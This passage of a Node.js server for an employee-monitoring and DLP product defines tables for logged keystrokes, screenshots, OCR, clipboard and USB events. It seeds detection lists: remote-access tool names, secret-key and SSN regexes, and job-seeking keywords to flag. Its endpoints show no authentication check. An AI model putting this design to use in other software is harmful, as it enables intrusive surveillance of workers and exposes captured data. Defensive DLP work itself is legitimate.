  CREATE TABLE IF NOT EXISTS activities (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT, username TEXT, window_title TEXT,
    keystrokes TEXT, ocr_text TEXT, status TEXT, screen_path TEXT,
    category TEXT, url TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS nicknames (
    hostname TEXT PRIMARY KEY,
    nickname TEXT NOT NULL,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS file_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT, type TEXT, path TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS alerts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT, type TEXT, message TEXT, severity TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT
  );
  CREATE TABLE IF NOT EXISTS policies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT, type TEXT, action TEXT, status TEXT, severity TEXT,
    conditions TEXT, targets TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT, type TEXT, format TEXT, size TEXT,
    content TEXT, status TEXT DEFAULT 'Ready',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS attendance (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT, username TEXT, event TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS attendance_overrides (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT NOT NULL,
    day TEXT NOT NULL,
    clock_in TEXT, clock_out TEXT,
    hours_worked REAL,
    status TEXT DEFAULT 'Present',
    note TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(hostname, day)
  );
`);

// ═══════════════════════════════════════════════
// DLP ENTERPRISE TABLES
// ═══════════════════════════════════════════════
db.exec(`
  CREATE TABLE IF NOT EXISTS dlp_dictionaries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    category TEXT DEFAULT 'Custom',
    keywords TEXT NOT NULL,
    weight INTEGER DEFAULT 5,
    case_sensitive INTEGER DEFAULT 0,
    proximity_words INTEGER DEFAULT 0,
    status TEXT DEFAULT 'Active',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_regex_patterns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    pattern TEXT NOT NULL,
    category TEXT DEFAULT 'Custom',
    severity TEXT DEFAULT 'Medium',
    status TEXT DEFAULT 'Active',
    test_sample TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_classifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    file_path TEXT,
    file_name TEXT,
    file_hash TEXT,
    classification TEXT DEFAULT 'Internal',
    classified_by TEXT DEFAULT 'Auto',
    matched_rules TEXT,
    confidence REAL DEFAULT 0.0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_usb_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    username TEXT,
    device_name TEXT,
    vendor_id TEXT,
    product_id TEXT,
    serial_number TEXT,
    device_type TEXT DEFAULT 'Unknown',
    action TEXT DEFAULT 'Connected',
    policy_action TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_clipboard_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    username TEXT,
    content_type TEXT DEFAULT 'Text',
    content_preview TEXT,
    content_length INTEGER DEFAULT 0,
    source_app TEXT,
    dest_app TEXT,
    action TEXT DEFAULT 'Copy',
    policy_triggered TEXT,
    blocked INTEGER DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_print_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    username TEXT,
    document_name TEXT,
    printer_name TEXT,
    printer_type TEXT DEFAULT 'Local',
    pages INTEGER DEFAULT 0,
    copies INTEGER DEFAULT 1,
    color_mode TEXT DEFAULT 'Unknown',
    paper_size TEXT DEFAULT 'A4',
    app_used TEXT,
    policy_triggered TEXT,
    blocked INTEGER DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_incidents (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT,
    username TEXT,
    incident_type TEXT,
    channel TEXT,
    severity TEXT DEFAULT 'Medium',
    policy_id INTEGER,
    policy_name TEXT,
    content_snippet TEXT,
    file_name TEXT,
    file_path TEXT,
    destination TEXT,
    action_taken TEXT DEFAULT 'Logged',
    status TEXT DEFAULT 'Open',
    risk_score REAL DEFAULT 0.0,
    shadow_copy_path TEXT,
    reviewed_by TEXT,
    review_notes TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    reviewed_at DATETIME
  );
  CREATE TABLE IF NOT EXISTS dlp_user_risk (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT UNIQUE,
    username TEXT,
    risk_score REAL DEFAULT 0.0,
    risk_level TEXT DEFAULT 'Low',
    total_incidents INTEGER DEFAULT 0,
    critical_incidents INTEGER DEFAULT 0,
    high_incidents INTEGER DEFAULT 0,
    medium_incidents INTEGER DEFAULT 0,
    low_incidents INTEGER DEFAULT 0,
    data_volume_mb REAL DEFAULT 0.0,
    anomaly_flags TEXT,
    watchlist INTEGER DEFAULT 0,
    last_incident DATETIME,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_compliance_templates (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    framework TEXT NOT NULL,
    name TEXT NOT NULL,
    description TEXT,
    rules TEXT,
    controls TEXT,
    status TEXT DEFAULT 'Draft',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS dlp_audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    admin_user TEXT DEFAULT 'admin',
    action TEXT,
    target_type TEXT,
    target_id INTEGER,
    details TEXT,
    ip_address TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

// ═══════════════════════════════════════════════
// TRIGGER ENGINE TABLES
// ═══════════════════════════════════════════════
db.exec(`
  CREATE TABLE IF NOT EXISTS triggered_recordings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT NOT NULL,
    username TEXT,
    trigger_type TEXT NOT NULL,
    trigger_detail TEXT,
    started_at DATETIME NOT NULL,
    ended_at DATETIME,
    duration_seconds INTEGER DEFAULT 0,
    frame_count INTEGER DEFAULT 0,
    status TEXT DEFAULT 'Recording',
    admin_notes TEXT,
    tags TEXT,
    metadata TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS trigger_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    hostname TEXT NOT NULL,
    trigger_type TEXT NOT NULL,
    trigger_detail TEXT,
    recording_id INTEGER REFERENCES triggered_recordings(id),
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  );
`);

// ═══════════════════════════════════════════════
// TRIGGER ENGINE API ENDPOINTS
// ═══════════════════════════════════════════════

// Agent reports a trigger event firing
app.post("/api/trigger-events", (req, res) => {
  const { hostname, username, trigger_type, trigger_detail, metadata } = req.body;
  if (!hostname || !trigger_type) return res.status(400).json({ error: "hostname and trigger_type required" });

  // Create triggered_recording entry
  const recording = db.prepare(`
    INSERT INTO triggered_recordings (hostname, username, trigger_type, trigger_detail, started_at, metadata)
    VALUES (?, ?, ?, ?, datetime('now'), ?)
  `).run(hostname, username || "", trigger_type, trigger_detail || "", metadata ? JSON.stringify(metadata) : null);

  // Create trigger_log entry
  db.prepare(`
    INSERT INTO trigger_log (hostname, trigger_type, trigger_detail, recording_id)
    VALUES (?, ?, ?, ?)
  `).run(hostname, trigger_type, trigger_detail || "", recording.lastInsertRowid);

  // Broadcast to dashboard
  io.emit("trigger-event", {
    id: recording.lastInsertRowid,
    hostname, trigger_type, trigger_detail,
    timestamp: new Date().toISOString()
  });

  res.json({ success: true, recordingId: recording.lastInsertRowid });
});

// Dashboard fetches trigger log (filterable)
app.get("/api/trigger-log", (req, res) => {
  try {
    const { hostname, trigger_type, from, to, limit = 200 } = req.query;
    let where = "1=1";
    const params = [];
    if (hostname) { where += " AND tl.hostname = ?"; params.push(hostname); }
    if (trigger_type) { where += " AND tl.trigger_type = ?"; params.push(trigger_type); }
    if (from) { where += " AND tl.timestamp >= ?"; params.push(from); }
    if (to) { where += " AND tl.timestamp <= ?"; params.push(to); }
    params.push(parseInt(limit));

    const data = db.prepare(`
      SELECT tl.*, tr.status as recording_status, tr.duration_seconds, tr.frame_count
      FROM trigger_log tl
      LEFT JOIN triggered_recordings tr ON tl.recording_id = tr.id
      WHERE ${where}
      ORDER BY tl.timestamp DESC
      LIMIT ?
    `).all(...params);
    res.json(data);
  } catch (e) {
    res.json([]);
  }
});

// List all triggered recordings
app.get("/api/triggered-recordings", (req, res) => {
  try {
    const { hostname, status, limit = 100 } = req.query;
    let where = "1=1";
    const params = [];
    if (hostname) { where += " AND hostname = ?"; params.push(hostname); }
    if (status) { where += " AND status = ?"; params.push(status); }
    params.push(parseInt(limit));

    const data = db.prepare(`
      SELECT * FROM triggered_recordings WHERE ${where} ORDER BY created_at DESC LIMIT ?
    `).all(...params);
    res.json(data);
  } catch (e) {
    res.json([]);
  }
});

// Get specific recording with linked activity frames
app.get("/api/triggered-recordings/:id", (req, res) => {
  try {
    const recording = db.prepare("SELECT * FROM triggered_recordings WHERE id = ?").get(req.params.id);
    if (!recording) return res.status(404).json({ error: "Recording not found" });

    // Get associated activity frames (captured during the recording window)
    const frames = recording.started_at && recording.ended_at ? db.prepare(`
      SELECT id, window_title, screen_path, category, status, timestamp
      FROM activities
      WHERE hostname = ? AND timestamp BETWEEN ? AND ?
      AND screen_path IS NOT NULL AND screen_path != ''
      ORDER BY timestamp ASC
    `).all(recording.hostname, recording.started_at, recording.ended_at) : [];

    res.json({ ...recording, frames });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Admin annotates a triggered recording
app.patch("/api/triggered-recordings/:id", (req, res) => {
  try {
    const { admin_notes, tags } = req.body;
    const updates = [];
    const params = [];
    if (admin_notes !== undefined) { updates.push("admin_notes = ?"); params.push(admin_notes); }
    if (tags !== undefined) { updates.push("tags = ?"); params.push(tags); }
    if (updates.length === 0) return res.json({ success: true, updated: 0 });
    params.push(req.params.id);
    db.prepare(`UPDATE triggered_recordings SET ${updates.join(", ")} WHERE id = ?`).run(...params);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Agent reports session ended
app.post("/api/trigger-session-end", (req, res) => {
  const { recordingId, duration_seconds, frame_count } = req.body;
  if (!recordingId) return res.status(400).json({ error: "recordingId required" });
  db.prepare(`
    UPDATE triggered_recordings
    SET ended_at = datetime('now'), duration_seconds = ?, frame_count = ?, status = 'Completed'
    WHERE id = ?
  `).run(duration_seconds || 0, frame_count || 0, recordingId);

  io.emit("trigger-session-end", { recordingId, duration_seconds, frame_count });
  res.json({ success: true });
});

// Manual admin trigger start/stop via socket
io.on("connection", (socket) => {
  socket.on("start-triggered-recording", (data) => {
    const targetSocket = Array.from(io.sockets.sockets.values())
      .find(s => s.hostname === data.hostname);
    if (targetSocket) {
      targetSocket.emit("start-triggered-recording", { trigger_type: "MANUAL_ADMIN_START" });
    }
  });
  socket.on("stop-triggered-recording", (data) => {
    const targetSocket = Array.from(io.sockets.sockets.values())
      .find(s => s.hostname === data.hostname);
    if (targetSocket) {
      targetSocket.emit("stop-triggered-recording");
    }
  });
});

// ═══════════════════════════════════════════════
// STORAGE LIFECYCLE — RETENTION PURGE JOB (48-Hour Auto & Manual)
// ═══════════════════════════════════════════════
function runStorageCleanup(hoursOverride = null) {
  try {
    let hours = hoursOverride;
    if (!hours) {
      const hoursRow = db.prepare("SELECT value FROM settings WHERE key = 'retention_hours'").get();
      if (hoursRow && hoursRow.value) {
        hours = parseFloat(hoursRow.value);
      } else {
        const daysRow = db.prepare("SELECT value FROM settings WHERE key = 'retention_days'").get();
        hours = (daysRow ? parseFloat(daysRow.value) : 2) * 24; // Default 2 days = 48 hours
      }
    }

    if (isNaN(hours) || hours <= 0) hours = 48; // Fallback 48 hours

    // Purge old triggered recordings
    const oldRecordings = db.prepare(`
      SELECT id FROM triggered_recordings
      WHERE created_at < datetime('now', '-' || ? || ' hours')
    `).all(hours);

    let purgedRecordings = 0;
    if (oldRecordings.length > 0) {
      const ids = oldRecordings.map(r => r.id);
      db.prepare(`UPDATE triggered_recordings SET status = 'Purged' WHERE id IN (${ids.join(",")})`).run();
      purgedRecordings = ids.length;
      console.log(`[PURGE] Marked ${purgedRecordings} old triggered recordings as Purged (${hours}h retention)`);
    }

    // Purge old activity screenshots from disk
    const oldScreens = db.prepare(`
      SELECT screen_path FROM activities
      WHERE timestamp < datetime('now', '-' || ? || ' hours')
      AND screen_path IS NOT NULL AND screen_path != ''
    `).all(hours);

    let deletedFiles = 0;
    for (const row of oldScreens) {
      try {
        const fullPath = path.join(STORAGE_DIR, row.screen_path);
        if (fs.existsSync(fullPath)) { fs.unlinkSync(fullPath); deletedFiles++; }
      } catch {}
    }

    let deletedRecords = 0;
    if (oldScreens.length > 0) {
      const res = db.prepare(`
        DELETE FROM activities
        WHERE timestamp < datetime('now', '-' || ? || ' hours')
        AND screen_path IS NOT NULL AND screen_path != ''
      `).run(hours);
      deletedRecords = res.changes || oldScreens.length;
      console.log(`[PURGE] Cleaned ${deletedFiles} screenshot files, removed ${deletedRecords} activity records older than ${hours} hours`);
    }

    return { success: true, hoursUsed: hours, deletedFiles, deletedRecords, purgedRecordings };
  } catch (e) {
    console.error("[PURGE] Error:", e.message);
    return { success: false, error: e.message };
  }
}

// Manual storage cleanup endpoint (Triggered from Dashboard/Settings UI)
app.post("/api/storage/cleanup", (req, res) => {
  const { hours } = req.body || {};
  const result = runStorageCleanup(hours ? parseFloat(hours) : null);
  res.json(result);
});

// Auto-cleanup timer running every 1 hour (48-hour default retention window)
setInterval(() => {
  const autoCleanupRow = db.prepare("SELECT value FROM settings WHERE key = 'storage_auto_cleanup'").get();
  if (!autoCleanupRow || autoCleanupRow.value === "true") {
    runStorageCleanup();
  }
}, 60 * 60 * 1000); // Hourly check

// Initial Settings
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("risk_keywords", "job, resume, linkedin, password, competitor, confidential, bank");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("retention_days", "2");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("retention_hours", "48");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("company_name", "HBOSE");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("timezone", "UTC");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("work_start_time", "09:00");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("work_end_time", "18:00");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("late_threshold_minutes", "30");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("agent_capture_interval", "5");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("agent_capture_quality", "60");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("ocr_enabled", "true");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("ocr_language", "eng");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("dlp_auto_scan", "true");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("storage_max_gb", "50");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("alert_auto_dismiss_hours", "72");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("alert_severity_threshold", "Low");

// Blackout / Lockdown settings
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("blackout_message", "Your device has been locked by your administrator.");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("blackout_contact_phone", "");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("blackout_contact_email", "");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("blackout_contact_url", "");

// Trigger engine settings
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_rat_watchlist", "TeamViewer.exe,AnyDesk.exe,msra.exe,ScreenConnect.ClientService.exe,remoting_host.exe");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_content_keywords", "confidential,top secret,ssn,social security");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_content_regex", "\\b(?!000|666|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0000)\\d{4}\\b");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_site_categories", "adult,gambling,piracy,darkweb");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_rat_grace_seconds", "60");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_content_duration_seconds", "120");
db.prepare("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)").run("trigger_buffer_seconds", "30");

// ═══════════════════════════════════════════════
// SEED DLP DATA (Built-in Dictionaries & Regex)
// ═══════════════════════════════════════════════
const dictCount = db.prepare("SELECT COUNT(*) as c FROM dlp_dictionaries").get().c;
if (dictCount === 0) {
  const seedDicts = [
    ["PII - Personal Identifiers", "Social Security Numbers, passport, driver license", "PII", "ssn,social security,passport number,driver license,date of birth,dob,national id,taxpayer", 8, 0, 5],
    ["Financial Data", "Credit cards, bank accounts, financial terms", "Financial", "credit card,bank account,iban,swift,routing number,account number,cvv,expiration date,billing address", 9, 0, 3],
    ["Healthcare - PHI", "Protected Health Information keywords", "Healthcare", "patient,diagnosis,prescription,medical record,health insurance,hipaa,treatment plan,blood type,allergy", 9, 0, 5],
    ["Confidential Business", "Internal business confidentiality markers", "Business", "confidential,top secret,internal only,proprietary,trade secret,nda,non-disclosure,restricted,classified", 7, 0, 0],
    ["Job Seeking Indicators", "Keywords indicating job-seeking behavior", "HR", "resume,curriculum vitae,cover letter,job application,linkedin jobs,indeed,glassdoor,salary negotiation,offer letter", 5, 0, 0],
    ["Competitive Intelligence", "Competitor and sensitive intelligence terms", "Business", "competitor,market share,acquisition,merger,due diligence,board meeting,earnings report,quarterly results", 6, 0, 3],
    ["Source Code & IP", "Intellectual property and source code markers", "Technology", "api key,secret key,access token,private key,ssh key,password hash,database connection,source code,repository", 8, 0, 0],
    ["Legal - Compliance", "Legal terms and compliance markers", "Legal", "attorney-client,privileged,settlement,litigation,subpoena,deposition,cease and desist,indemnification", 7, 0, 0],
  ];
  const stmt = db.prepare("INSERT INTO dlp_dictionaries (name, description, category, keywords, weight, case_sensitive, proximity_words) VALUES (?, ?, ?, ?, ?, ?, ?)");
  seedDicts.forEach(d => stmt.run(...d));
}

const regexCount = db.prepare("SELECT COUNT(*) as c FROM dlp_regex_patterns").get().c;
if (regexCount === 0) {
  const seedRegex = [
    ["Credit Card - Visa", "Visa card numbers (13-16 digits)", "4[0-9]{12}(?:[0-9]{3})?", "Financial", "High", "4111111111111111"],
    ["Credit Card - MasterCard", "MasterCard numbers", "5[1-5][0-9]{14}|2(?:2[2-9][1-9]|2[3-9][0-9]|[3-6][0-9]{2}|7[01][0-9]|720)[0-9]{12}", "Financial", "High", "5500000000000004"],
    ["Credit Card - Amex", "American Express numbers", "3[47][0-9]{13}", "Financial", "High", "378282246310005"],
    ["SSN - US", "US Social Security Numbers", "\\b(?!000|666|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0000)\\d{4}\\b", "PII", "Critical", "123-45-6789"],
    ["Email Address", "Email address pattern", "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}", "General", "Low", "user@example.com"],
    ["Phone - International", "International phone numbers", "\\+?[1-9]\\d{1,14}", "PII", "Medium", "+14155552671"],
    ["IBAN", "International Bank Account Number", "[A-Z]{2}\\d{2}[A-Z0-9]{4}\\d{7}([A-Z0-9]?){0,16}", "Financial", "High", "DE89370400440532013000"],
    ["IP Address - IPv4", "IPv4 address pattern", "\\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b", "Network", "Low", "192.168.1.100"],
    ["Passport - US", "US passport number pattern", "\\b[0-9]{9}\\b", "PII", "High", "123456789"],
    ["AWS Access Key", "AWS access key detection", "AKIA[0-9A-Z]{16}", "Technology", "Critical", "AKIAIOSFODNN7EXAMPLE"],
    ["Private Key Header", "SSH/RSA private key detection", "-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----", "Technology", "Critical", "-----BEGIN RSA PRIVATE KEY-----"],
  ];
  const stmt = db.prepare("INSERT INTO dlp_regex_patterns (name, description, pattern, category, severity, test_sample) VALUES (?, ?, ?, ?, ?, ?)");
  seedRegex.forEach(r => stmt.run(...r));
}

const complianceCount = db.prepare("SELECT COUNT(*) as c FROM dlp_compliance_templates").get().c;
if (complianceCount === 0) {
  const seedCompliance = [
    ["GDPR", "General Data Protection Regulation", "EU data protection and privacy regulation for all EU citizens", '["PII detection","Right to erasure","Data minimization","Consent management","Cross-border transfer monitoring"]', '["Art.5 - Lawfulness","Art.6 - Consent","Art.17 - Right to Erasure","Art.32 - Security","Art.33 - Breach Notification"]'],
    ["HIPAA", "Health Insurance Portability and Accountability Act", "US healthcare data protection standard", '["PHI detection","Access controls","Audit trails","Encryption enforcement","Minimum necessary rule"]', '["Privacy Rule","Security Rule","Breach Notification Rule","Enforcement Rule"]'],
    ["PCI-DSS", "Payment Card Industry Data Security Standard", "Credit card data protection standard", '["Cardholder data detection","Network segmentation","Encryption in transit","Access logging","Vulnerability scanning"]', '["Req.3 - Protect stored data","Req.4 - Encrypt transmission","Req.7 - Restrict access","Req.10 - Track and monitor","Req.12 - Security policy"]'],
    ["SOX", "Sarbanes-Oxley Act", "Financial reporting and corporate governance", '["Financial data monitoring","Access controls","Change management","Audit trails","Segregation of duties"]', '["Section 302 - Corporate responsibility","Section 404 - Internal controls","Section 802 - Criminal penalties","Section 906 - CEO/CFO certification"]'],
    ["ISO 27001", "Information Security Management System", "International standard for information security management", '["Asset classification","Risk assessment","Access control","Incident management","Business continuity"]', '["A.5 - Information security policies","A.8 - Asset management","A.9 - Access control","A.12 - Operations security","A.16 - Incident management"]'],
    ["NIST CSF", "NIST Cybersecurity Framework", "US cybersecurity framework for critical infrastructure", '["Identify assets","Protect data","Detect anomalies","Respond to incidents","Recover operations"]', '["Identify","Protect","Detect","Respond","Recover"]'],
  ];
  const stmt = db.prepare("INSERT INTO dlp_compliance_templates (framework, name, description, rules, controls) VALUES (?, ?, ?, ?, ?)");
  seedCompliance.forEach(c => stmt.run(...c));
}

// Seed Policies if empty
const policyCount = db.prepare("SELECT COUNT(*) as count FROM policies").get().count;
if (policyCount === 0) {
  const seedPolicies = [
    ["facebook.com", "Website", "Block & Warn", "Active", "Medium"],
    ["instagram.com", "Website", "Block & Warn", "Active", "Medium"],
    ["twitter.com", "Website", "Block & Warn", "Active", "Medium"],
    ["tiktok.com", "Website", "Block & Warn", "Active", "Medium"],
    ["reddit.com", "Website", "Block & Warn", "Active", "Low"],
    ["youtube.com", "Website", "Block & Warn", "Paused", "Low"],
    ["netflix.com", "Website", "Block & Warn", "Active", "Medium"],
    ["twitch.tv", "Website", "Block & Warn", "Active", "Medium"],
    ["discord.com", "Website", "Block & Warn", "Paused", "Low"],
    ["store.steampowered.com", "Website", "Block & Warn", "Active", "High"],
    ["linkedin.com/jobs", "Website", "Block & Warn", "Active", "High"],
    ["indeed.com", "Website", "Block & Warn", "Active", "High"],
    ["Social Media Alert", "App Usage", "Log Only", "Active", "Low"],
    ["Data Transfer Prevention", "Network", "Lockout", "Paused", "Critical"],
    ["Confidential OCR Match", "OCR", "Notify Admin", "Active", "High"],
    ["USB Device Alert", "Device", "Log Only", "Active", "Medium"],
    ["After Hours Activity", "Time", "Log Only", "Active", "Low"],
  ];
  const stmt = db.prepare("INSERT INTO policies (name, type, action, status, severity) VALUES (?, ?, ?, ?, ?)");
  seedPolicies.forEach(p => stmt.run(...p));
}

// Seed Reports if empty
const reportCount = db.prepare("SELECT COUNT(*) as count FROM reports").get().count;
if (reportCount === 0) {
  const seedReports = [
    ["Weekly Productivity Summary", "Productivity", "PDF", "2.4 MB"],
    ["DLP Violation Audit", "Security", "CSV", "1.1 MB"]
  ];
  const stmt = db.prepare("INSERT INTO reports (name, type, format, size) VALUES (?, ?, ?, ?)");
  seedReports.forEach(r => stmt.run(...r));
}

// Migration: Ensure 'status' column exists if DB was created earlier
try {
  db.prepare("ALTER TABLE activities ADD COLUMN status TEXT").run();
  console.log("[DB] Migration: Added 'status' column to activities.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE activities ADD COLUMN ocr_text TEXT").run();
  console.log("[DB] Migration: Added 'ocr_text' column to activities.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE activities ADD COLUMN url TEXT").run();
  console.log("[DB] Migration: Added 'url' column to activities.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE alerts ADD COLUMN severity TEXT").run();
  console.log("[DB] Migration: Added 'severity' column to alerts.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE alerts ADD COLUMN status TEXT DEFAULT 'Active'").run();
  console.log("[DB] Migration: Added 'status' column to alerts.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE reports ADD COLUMN content TEXT").run();
  console.log("[DB] Migration: Added 'content' column to reports.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE reports ADD COLUMN status TEXT DEFAULT 'Ready'").run();
  console.log("[DB] Migration: Added 'status' column to reports.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE policies ADD COLUMN conditions TEXT").run();
  console.log("[DB] Migration: Added 'conditions' column to policies.");
} catch (e) { }

try {
  db.prepare("ALTER TABLE policies ADD COLUMN targets TEXT").run();
  console.log("[DB] Migration: Added 'targets' column to policies.");
} catch (e) { }

const STORAGE_DIR = path.join(__dirname, "storage");
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR);

// ═══════════════════════════════════════════════
// SESSION RECORDINGS API — Browse & Playback
// ═══════════════════════════════════════════════

// Get all recorded dates for a hostname (or all hosts)
app.get("/api/recordings/dates", (req, res) => {
  try {
    const { hostname } = req.query;
    let query, params;
    if (hostname) {
      query = `SELECT DISTINCT date(timestamp) as date, COUNT(*) as frameCount, 
               hostname, username,
               MIN(timestamp) as firstFrame, MAX(timestamp) as lastFrame
               FROM activities WHERE hostname = ? AND screen_path IS NOT NULL AND screen_path != ''
               GROUP BY date(timestamp), hostname 
               ORDER BY date DESC LIMIT 90`;
      params = [hostname];
    } else {
      query = `SELECT DISTINCT date(timestamp) as date, hostname, username,
               COUNT(*) as frameCount,
               MIN(timestamp) as firstFrame, MAX(timestamp) as lastFrame
               FROM activities WHERE screen_path IS NOT NULL AND screen_path != ''
               GROUP BY date(timestamp), hostname 
               ORDER BY date DESC LIMIT 200`;
      params = [];
    }
    const data = db.prepare(query).all(...params);
    res.json(data);
  } catch (e) {
    res.json([]);
  }
});

// Get thumbnails for a specific date + hostname (grid view)
app.get("/api/recordings/thumbnails", (req, res) => {
  try {
    const { hostname, date, page = 0, limit = 60 } = req.query;
    if (!hostname || !date) return res.json([]);
    const offset = parseInt(page) * parseInt(limit);
    const data = db.prepare(`
      SELECT id, hostname, username, window_title, screen_path, category, status, timestamp
      FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
      ORDER BY timestamp ASC
      LIMIT ? OFFSET ?
    `).all(hostname, date, parseInt(limit), offset);
    
    const total = db.prepare(`
      SELECT COUNT(*) as total FROM activities 
      WHERE hostname = ? AND date(timestamp) = ? AND screen_path IS NOT NULL AND screen_path != ''
    `).get(hostname, date);
    
    res.json({ frames: data, total: total.total, page: parseInt(page), limit: parseInt(limit) });
  } catch (e) {
    res.json({ frames: [], total: 0 });
  }
});

// Get playback-ready sequence (all frames for a date, ordered chronologically)
app.get("/api/recordings/playback", (req, res) => {
  try {
    const { hostname, date, startTime, endTime } = req.query;
    if (!hostname || !date) return res.json({ frames: [], summary: {} });
    
    let timeFilter = "";
